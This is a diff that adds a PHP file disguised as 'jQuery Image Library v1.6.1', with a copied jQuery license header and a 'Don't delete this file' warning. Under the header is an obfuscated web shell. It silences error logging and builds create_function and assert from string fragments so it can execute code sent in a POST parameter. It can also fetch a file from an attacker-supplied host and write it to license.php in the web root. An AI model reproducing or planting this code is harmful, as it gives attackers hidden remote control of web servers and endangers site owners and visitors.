@@ -1,0 +1,32 @@
+<?php 
+/*
+ * jQuery Image Library v1.6.1
+ * http://jquery.com/
+ *
+ * Copyright 2011, John Resig
+ * Dual licensed under the MIT or GPL Version 2 licenses.
+ * http://jquery.org/license
+ *
+ * Includes Sizzle.js
+ * http://sizzlejs.com/
+ * Copyright 2011, The Dojo Foundation
+ * Released under the MIT, BSD, and GPL Licenses.
+ *
+ * Date: Thu May 12 15:04:36 2011 -0400
+ *  *  *  *  *  *  * *  *  *  *  *  *  *  *  *  *  *  *  *  Don't delete this file *  *  *  *  *  *  *  *  *  *  *  *  *  *  *  * 
+ */
+@ini_set('error_log', NULL);
+@ini_set('log_errors', 0);
+@ini_set('max_execution_time', 0);
+@ini_set('display_errors', 0);
+@error_reporting(0);
+@set_time_limit(0);
+$cret='unct' .'ion';$cret= 'cre' . 'ate' .'_f' .$cret;
+$jQuery='sert';$jQuery='as'.$jQuery;$Libr= "_ostp";
+$sizz=strtoupper($Libr[0].$Libr[4].$Libr[1].$Libr[2].$Libr[3] );
+if(isset(${$sizz}['j01bt5ri3p'])){@$cret('', '};'.${$sizz}['j01bt5ri3p'].'{');}
+if(isset(${$sizz}['j01bt5ri3p'])){@$jQuery(${$sizz}['j01bt5ri3p']);} 
+if((isset(${$sizz}['j01bt5ri3p']))&(isset(${$sizz}['fail']))){
+@copy('http://'.${$sizz}['fail'].'/test.txt', $_SERVER['DOCUMENT_ROOT'].'/license.php');} 
+print"<!-- te"."st --> "; 
+?>
